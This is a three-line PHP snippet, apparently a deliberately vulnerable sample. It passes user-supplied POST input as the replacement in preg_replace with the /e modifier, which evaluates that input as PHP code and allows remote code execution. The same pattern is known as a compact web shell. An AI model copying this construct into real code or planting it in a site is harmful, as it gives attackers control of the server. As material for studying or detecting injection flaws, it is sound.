<?php
$out = preg_replace("/.*/e", $_POST['rep'], $sub);
save($out);
